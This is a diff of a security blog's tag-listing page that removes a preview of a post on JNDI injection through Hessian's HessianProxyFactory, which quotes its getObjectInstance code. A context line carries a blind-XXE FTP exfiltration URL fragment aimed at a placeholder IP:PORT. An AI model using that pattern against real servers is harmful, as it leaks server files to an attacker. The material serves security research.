@@ -183,20 +183,6 @@ ftp://username:%file;@IP:PORT/asdasd 将数据从密码处传递，只能读一�
   <footer class="entry-footer"><span title='2023-11-22 15:16:46 +0000 UTC'>November 22, 2023</span>&nbsp;·&nbsp;1 min</footer>
   <a class="entry-link" aria-label="post link to 盲XXE中FTP协议的利用" href="https://zoiltin.github.io/posts/%E7%9B%B2xxe%E4%B8%ADftp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"></a>
 </article>
-
-<article class="post-entry tag-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">JNDI注入HessianProxyFactory的一点思考
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>HessianProxy 浅蓝师傅在 探索高版本 JDK 下 JNDI 漏洞的利用方法 中提到过HessianProxyFactory这个工厂类。可以触发Hessian反序列化。
-getObjectInstance代码如下：
-public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?,?&gt; environment) throws Exception { Reference ref = (Reference) obj; String api = null; String url = null; for (int i = 0; i &lt; ref.size(); i&#43;&#43;) { RefAddr addr = ref.get(i); String type = addr.getType(); String value = (String) addr.getContent(); if (type.equals(&#34;type&#34;)) api = value; else if (type.equals(&#34;url&#34;)) url = value; ......... } ....</p>
-  </div>
-  <footer class="entry-footer">3 min</footer>
-  <a class="entry-link" aria-label="post link to JNDI注入HessianProxyFactory的一点思考" href="https://zoiltin.github.io/posts/jndi%E6%B3%A8%E5%85%A5hessianproxyfactory%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83/"></a>
-</article>
     </main>
     
 <footer class="footer">
